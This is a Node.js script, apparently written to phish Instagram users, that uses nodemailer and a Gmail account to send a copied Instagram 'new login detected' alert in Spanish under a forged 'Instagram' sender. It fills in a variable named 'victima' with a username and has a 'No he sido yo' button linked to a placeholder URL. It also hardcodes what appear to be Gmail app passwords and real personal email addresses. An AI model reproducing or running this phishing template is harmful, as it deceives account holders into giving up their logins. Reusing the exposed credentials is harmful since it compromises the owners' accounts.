import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
dotenv.config();

const mes = "January";
const dia = "2";
const hora = "12:00 AM";
const victima = "scriptonite_og";
const url = "#"

const pasword = process.env.ADMIN_GMAIL;
console.log(pasword);
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'kasvermath@gmail.com', // Tu correo de Gmail
    // pass: "msbbtlrsougibcbw", // Necesitas una contraseña de aplicación
    pass: "badgkjiehltcvjbj"
  },
});

transporter.sendMail({
  from: '"Instagram" <instagram@no-reply.com>', // Dirección inventada (remitente)
  to: 'carlosvassan@gmail.com', // Destinatario real
  subject: 'Prueba desde Nodemailer',
  html: `
    <div class="aHl"></div>
<div id=":14z" tabindex="-1"></div>
<div id=":159" class="ii gt">
  <div id=":14i" class="a3s aiL msg-6303114661402900605">
    <u></u>
    <div style="margin: 0; padding: 0" dir="ltr" bgcolor="#ffffff">
      <table
        border="0"
        cellspacing="0"
        cellpadding="0"
        align="center"
        id="m_-6303114661402900605email_table"
        style="border-collapse: collapse"
      >
        <tbody>
          <tr>
            <td
              id="m_-6303114661402900605email_content"
              style="
                font-family: Helvetica Neue, Helvetica, Lucida Grande, tahoma, verdana, arial, sans-serif;
                background: #ffffff;
              "
            >
              <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse: collapse">
                <tbody>
                  <tr>
                    <td height="20" style="line-height: 20px" colspan="3">&nbsp;</td>
                  </tr>
                  <tr>
                    <td height="1" colspan="3" style="line-height: 1px"></td>
                  </tr>
                  <tr>
                    <td>
                      <table
                        border="0"
                        width="100%"
                        cellspacing="0"
                        cellpadding="0"
                        style="border-collapse: collapse; text-align: center; width: 100%"
                      >
                        <tbody>
                          <tr>
                            <td width="16px" style="width: 16px"></td>
                            <td style="line-height: 0px; max-width: 600px; padding: 0 0 15px 0">
                              <table border="0" cellspacing="0" cellpadding="0" style="border-collapse: collapse">
                                <tbody>
                                  <tr>
                                    <td style="width: 100%; text-align: left; height: 33px">
                                      <a
                                        href="https://www.instagram.com/_n/mainfeed?utm_campaign=ig_suspicious_login&amp;utm_medium=email&amp;target_user_id=71333220027&amp;utm_source=instagram&amp;ndid=62a53e188b983G24bc3d76c4cebbG62a542b1ebc56G9e4"
                                        style="color: #1b74e4; text-decoration: none"
                                        target="_blank"
                                        data-saferedirecturl="https://www.google.com/url?q=https://www.instagram.com/_n/mainfeed?utm_campaign%3Dig_suspicious_login%26utm_medium%3Demail%26target_user_id%3D71333220027%26utm_source%3Dinstagram%26ndid%3D62a53e188b983G24bc3d76c4cebbG62a542b1ebc56G9e4&amp;source=gmail&amp;ust=1735942259123000&amp;usg=AOvVaw1SyDfp_2lpHxR7hoFPTZAs"
                                        ><img
                                          height="30"
                                          src="https://ci3.googleusercontent.com/meips/ADKq_NaMfISzQkM1EcOlwwiEqKCSkO3918Q1mHZJzMcWzWrmAXu2osuL9xiNtj4lKxuUZFqOgTf5zRS2T7a3UjazJVbFvv3HD45VI6wXhtkqCIFciQo=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yO/r/Otjcwa2eCOF.png"
                                          style="border: 0"
                                          class="CToWUd"
                                          data-bit="iit"
                                      /></a>
                                    </td>
                                    <td style="line-height: 18px; min-width: 60px; text-align: right">
                                      <a
                                        href="https://www.instagram.com/_n/user?utm_campaign=ig_suspicious_login&amp;utm_medium=email&amp;target_user_id=71333220027&amp;utm_source=instagram&amp;username=${victima}&amp;ndid=62a53e188b983G24bc3d76c4cebbG62a542b1ebc56G9e4"
                                        style="color: #1b74e4; text-decoration: none"
                                        target="_blank"
                                        data-saferedirecturl="https://www.google.com/url?q=https://www.instagram.com/_n/user?utm_campaign%3Dig_suspicious_login%26utm_medium%3Demail%26target_user_id%3D71333220027%26utm_source%3Dinstagram%26username%3D${victima}%26ndid%3D62a53e188b983G24bc3d76c4cebbG62a542b1ebc56G9e4&amp;source=gmail&amp;ust=1735942259123000&amp;usg=AOvVaw0UXJRbVKbSJ5FEsxS8qkAX"
                                        ><img
                                          width="30"
                                          src="https://ci3.googleusercontent.com/meips/ADKq_Nb0nBRoRsBWd1pUL39YuiGtR0KF1uIuweoyCsFL03cwA3A7kIMT0DT4y8qXDow9M73-M9V_eclJFdxktoemv86zTD5JFiF2RwXahuPoFxSte3U6XNknUcSOQ34LuCw4MJVHvBYIKiuodVAV2Nssa-HU0c_pdb6PE8rXdZbchxUgzxcSBQW9IqQZuEIEV1MGGLUNBDTUok6mw0HBV0z_9UZ6tx3p0o9UXfv3zdQ1j1MvDJ4Dy4H4kU2BrmdeLZfu4m2GY6IE2fQrE90eo1AKMmynPlod5DhROtoPoT7ZWw_GLNkiyCDwMVAfsrikBUmzFxUdbgfuVbAbMTzWunXz-mBMUvROcDqqROKIaEFFRjRJ8qyGq_vw2BJ6Q0Kd7sx22GDaquY3e7Gf1aGh8kc=s0-d-e1-ft#https://scontent.xx.fbcdn.net/v/t51.2885-15/469651380_1763951921038000_2675582028279492892_n.jpg?_nc_cat=107&amp;ccb=1-7&amp;_nc_sid=7d201b&amp;_nc_ohc=0L5YwotXxY8Q7kNvgHIuUyQ&amp;_nc_ad=z-m&amp;_nc_cid=0&amp;_nc_zt=23&amp;_nc_ht=scontent.xx&amp;oh=00_AYD2OVpTtYgUqF-QniCZDqUD9Q6NRcnR4enfMA-jMCCD1g&amp;oe=6775B707"
                                          height="30"
                                          style="border: 0px; border-radius: 18px; vertical-align: middle"
                                          class="CToWUd"
                                          data-bit="iit"
                                          jslog="138226; u014N:xr6bB; 53:WzAsMl0."
                                      /></a>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                            <td width="16px" style="width: 16px"></td>
                          </tr>
                        </tbody>
                      </table>
                    </td>
                  </tr>
                  <tr>
                    <td>
                      <table
                        border="0"
                        width="430"
                        cellspacing="0"
                        cellpadding="0"
                        style="border-collapse: collapse; margin: 0 auto 0 auto"
                      >
                        <tbody>
                          <tr>
                            <td>
                              <table
                                border="0"
                                width="430px"
                                cellspacing="0"
                                cellpadding="0"
                                align="center"
                                style="border-collapse: collapse; margin: 0 auto 0 auto; text-align: center"
                              >
                                <tbody>
                                  <tr>
                                    <td height="16" style="line-height: 16px">&nbsp;</td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <table
                                        border="0"
                                        width="300px"
                                        cellspacing="0"
                                        cellpadding="0"
                                        align="center"
                                        style="border-collapse: collapse; text-align: center; margin: 0 auto 0 auto"
                                      >
                                        <tbody>
                                          <tr>
                                            <td
                                              style="
                                                width: 300px;
                                                padding: 0;
                                                margin: 0;
                                                text-align: center;
                                                color: #262626;
                                                font-size: 18px;
                                                font-family: Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;
                                              "
                                            >
                                              Hemos detectado un nuevo inicio de sesión, ${victima}
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </td>
                                  </tr>
                                  <tr>
                                    <td height="4" style="line-height: 4px">&nbsp;</td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <table
                                        border="0"
                                        width="300px"
                                        cellspacing="0"
                                        cellpadding="0"
                                        align="center"
                                        style="border-collapse: collapse; text-align: center; margin: 0 auto 0 auto"
                                      >
                                        <tbody>
                                          <tr>
                                            <td
                                              style="
                                                width: 300px;
                                                padding: 0;
                                                margin: 0;
                                                text-align: center;
                                                color: #999999;
                                                font-size: 14px;
                                                font-family: Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;
                                              "
                                            >
                                              Hemos detectado un inicio de sesión desde un dispositivo que normalmente
                                              no usas.
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </td>
                                  </tr>
                                  <tr>
                                    <td height="16" style="line-height: 16px">&nbsp;</td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                          </tr>
                          <tr>
                            <td>
                              <table
                                border="0"
                                width="430px"
                                cellspacing="0"
                                cellpadding="0"
                                align="center"
                                style="
                                  border-collapse: collapse;
                                  margin: 0 auto 0 auto;
                                  text-align: center;
                                  width: 430px;
                                "
                              >
                                <tbody>
                                  <tr>
                                    <td height="16" style="line-height: 16px">&nbsp;</td>
                                  </tr>
                                  <tr>
                                    <td align="center">
                                      <img
                                        width="76"
                                        src="https://ci3.googleusercontent.com/meips/ADKq_NZdDXHuEuz_FQbMSEhRUjmxs-tCpYh2z55Bf2Ll-FkF7aqdBKzRjzqzbmmijOYdi-UPlCRSLFcczK7ptAY1Se7oArTwvTM0_n5YWXcMgnqbFeU=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yp/r/7JLEaDkKvA7.png"
                                        height="76"
                                        style="border: 0"
                                        class="CToWUd"
                                        data-bit="iit"
                                      />
                                    </td>
                                  </tr>
                                  <tr>
                                    <td height="16" style="line-height: 16px">&nbsp;</td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                          </tr>
                          <tr>
                            <td>
                              <table
                                border="0"
                                width="430px"
                                cellspacing="0"
                                cellpadding="0"
                                align="center"
                                style="
                                  border-collapse: collapse;
                                  margin: 0 auto 0 auto;
                                  text-align: center;
                                  width: 430px;
                                "
                              >
                                <tbody>
                                  <tr>
                                    <td>
                                      <table
                                        border="0"
                                        width="300px"
                                        cellspacing="0"
                                        cellpadding="0"
                                        align="center"
                                        style="border-collapse: collapse; text-align: center; margin: 0 auto 0 auto"
                                      >
                                        <tbody>
                                          <tr>
                                            <td
                                              align="center"
                                              style="
                                                width: 300px;
                                                padding: 0;
                                                margin: 0;
                                                text-align: center;
                                                color: #262626;
                                                font-size: 16px;
                                                font-family: Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;
                                              "
                                            >
                                              A142 · Alicante, España
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </td>
                                  </tr>
                                  <tr>
                                    <td height="4" style="line-height: 4px">&nbsp;</td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <table
                                        border="0"
                                        width="300px"
                                        cellspacing="0"
                                        cellpadding="0"
                                        align="center"
                                        style="border-collapse: collapse; text-align: center; margin: 0 auto 0 auto"
                                      >
                                        <tbody>
                                          <tr>
                                            <td
                                              align="center"
                                              style="
                                                width: 300px;
                                                padding: 0;
                                                margin: 0;
                                                text-align: center;
                                                color: #999999;
                                                font-size: 14px;
                                                font-family: Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;
                                              "
                                            >
                                              ${mes} ${dia} at ${hora} (PDT)
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                          </tr>
                          <tr>
                            <td>
                              <table
                                border="0"
                                width="430px"
                                cellspacing="0"
                                cellpadding="0"
                                align="center"
                                style="
                                  border-collapse: collapse;
                                  margin: 0 auto 0 auto;
                                  text-align: center;
                                  width: 430px;
                                "
                              >
                                <tbody>
                                  <tr>
                                    <td height="16" style="line-height: 16px">&nbsp;</td>
                                  </tr>
                                  <tr>
                                    <td style="border-top: solid 1px #dbdbdb"></td>
                                  </tr>
                                  <tr>
                                    <td height="16" style="line-height: 16px">&nbsp;</td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                          </tr>
                          <tr>
                            <td>
                              <table
                                border="0"
                                width="430px"
                                cellspacing="0"
                                cellpadding="0"
                                align="center"
                                style="
                                  border-collapse: collapse;
                                  margin: 0 auto 0 auto;
                                  text-align: center;
                                  width: 430px;
                                "
                              >
                                <tbody>
                                  <tr>
                                    <td height="24" style="line-height: 24px">&nbsp;</td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <table
                                        border="0"
                                        width="300px"
                                        cellspacing="0"
                                        cellpadding="0"
                                        align="center"
                                        style="border-collapse: collapse; text-align: center; margin: 0 auto 0 auto"
                                      >
                                        <tbody>
                                          <tr>
                                            <td
                                              style="
                                                width: 300px;
                                                padding: 0;
                                                margin: 0;
                                                text-align: center;
                                                color: #999999;
                                                font-size: 14px;
                                                font-family: Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;
                                              "
                                            >
                                              Si has sido tú, no podrás acceder a ciertas opciones de seguridad y a la
                                              configuración de la cuenta durante unos días. Podrás seguir accediendo a
                                              esta configuración desde un dispositivo en el que hayas iniciado sesión en
                                              el pasado.
                                              <a
                                                href="${url}"
                                                style="
                                                  background-color: #3897f0;
                                                  border: none;
                                                  color: white;
                                                  padding: 10px 20px;
                                                  text-align: center;
                                                  text-decoration: none;
                                                  display: inline-block;
                                                  font-size: 14px;
                                                  margin: 4px 2px;
                                                  cursor: pointer;
                                                  border-radius: 4px;
                                                "
                                                target="_blank"
                                              >
                                                No he sido yo
                                              </a>
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                          </tr>
                          <tr>
                            <td>
                              <table
                                border="0"
                                width="430px"
                                cellspacing="0"
                                cellpadding="0"
                                align="center"
                                style="
                                  border-collapse: collapse;
                                  margin: 0 auto 0 auto;
                                  text-align: center;
                                  width: 430px;
                                "
                              >
                                <tbody>
                                  <tr>
                                    <td height="16" style="line-height: 16px">&nbsp;</td>
                                  </tr>
                                  <tr>
                                    <td>
                                      <table
                                        border="0"
                                        width="300px"
                                        cellspacing="0"
                                        cellpadding="0"
                                        align="center"
                                        style="border-collapse: collapse; text-align: center; margin: 0 auto 0 auto"
                                      >
                                        <tbody>
                                          <tr>
                                            <td
                                              style="
                                                width: 300px;
                                                padding: 0;
                                                margin: 0;
                                                text-align: center;
                                                color: #999999;
                                                font-size: 14px;
                                                font-family: Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;
                                              "
                                            >
                                              Si no has sido tú, puedes
                                            proteger tu cuenta
                                              desde un dispositivo en el que hayas iniciado sesión en el pasado. Más información
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </td>
                                  </tr>
                                  <tr>
                                    <td height="16" style="line-height: 16px">&nbsp;</td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                          </tr>
                        </tbody>
                      </table>
                    </td>
                  </tr>
                  <tr>
                    <td>
                      <table
                        border="0"
                        cellspacing="0"
                        cellpadding="0"
                        style="border-collapse: collapse; margin: 0 auto 0 auto; width: 100%; max-width: 600px"
                      >
                        <tbody>
                          <tr>
                            <td height="4" style="line-height: 4px" colspan="3">&nbsp;</td>
                          </tr>
                          <tr>
                            <td width="15px" style="width: 15px"></td>
                            <td width="20" style="display: block; width: 20px">&nbsp;&nbsp;&nbsp;</td>
                            <td style="text-align: center">
                              <div style="padding-top: 10px; display: flex">
                                <div style="margin: auto">
                                  <img
                                    src="https://ci3.googleusercontent.com/meips/ADKq_NbFbrtqvSI-aU5AfKmNpAL3mAaf2uq89BR-JyKu8laJbCF1cJNe9glyAkKB52iaPUFlNlZsDHNt56mBfLC5yq7aVwARZ6XFccDAN6dCcYJfqUA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/y3/r/Bqo9-L659wB.png"
                                    height="26"
                                    width="52"
                                    alt=""
                                    class="CToWUd"
                                    data-bit="iit"
                                  />
                                </div>
                                <br />
                              </div>
                              <div style="height: 10px"></div>
                              <div style="color: #abadae; font-size: 11px; margin: 0 auto 5px auto">
                                © <span class="il">Instagram</span>. Meta Platforms, Inc., 1601 Willow Road, Menlo Park,
                                CA 94025<br />
                              </div>
                              <div style="color: #abadae; font-size: 11px; margin: 0 auto 5px auto">
                                Este mensaje se ha enviado a
                                <a style="color: #abadae; text-decoration: underline">carlosvassan@gmail.com</a> y está
                                dirigido a ${victima}. ¿No es tu cuenta?
                                <a
                                  href="https://instagram.com/accounts/remove/revoke_wrong_email/?uidb36=wrpygu3&amp;token=6re-ca352b5aec051655e92a4e95a10cbb71&amp;nonce=xHMVbSva&amp;encoded_email=Y2FybG9zdmFzc2FuQGdtYWlsLmNvbQ"
                                  style="color: #abadae; text-decoration: underline"
                                  target="_blank"
                                  data-saferedirecturl="https://www.google.com/url?q=https://instagram.com/accounts/remove/revoke_wrong_email/?uidb36%3Dwrpygu3%26token%3D6re-ca352b5aec051655e92a4e95a10cbb71%26nonce%3DxHMVbSva%26encoded_email%3DY2FybG9zdmFzc2FuQGdtYWlsLmNvbQ&amp;source=gmail&amp;ust=1735942259123000&amp;usg=AOvVaw24onLPbd8fs_f4dxS1f00Q"
                                  >Suprime tu correo electrónico</a
                                >
                                de esta cuenta.<br />
                              </div>
                            </td>
                            <td width="20" style="display: block; width: 20px">&nbsp;&nbsp;&nbsp;</td>
                            <td width="15px" style="width: 15px"></td>
                          </tr>
                          <tr>
                            <td height="32" style="line-height: 32px" colspan="3">&nbsp;</td>
                          </tr>
                        </tbody>
                      </table>
                    </td>
                  </tr>
                  <tr>
                    <td height="20" style="line-height: 20px" colspan="3">&nbsp;</td>
                  </tr>
                </tbody>
              </table>
              <span
                ><img
                  src="https://ci3.googleusercontent.com/meips/ADKq_NZKoA1G36mOF0IMN_PsweAenmuGU2akxlkMvwLScxt4efV8l_tQ5yc8savuIeDBDQDBG57ofAbxEbc3Y6e1aIpxZw92QUZbNd2d4SI3FQPvnQtN0ODJ-V-pIPycfmCvadObWoDxEvP_eeCt8JIs0I81ifzI1emoXA=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=62a53e188b983G24bc3d76c4cebbG62a542b1ebc56G9e4"
                  style="border: 0; width: 1px; height: 1px"
                  class="CToWUd"
                  data-bit="iit"
              /></span>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
    <div class="yj6qo"></div>
    <div class="adL"></div>
  </div>
</div>
<div class="WhmR8e" data-hash="0"></div>
`
}, (error, info) => {
  if (error) {
    return console.log(error);
  }
  console.log('Email enviado: ' + info.response);
});

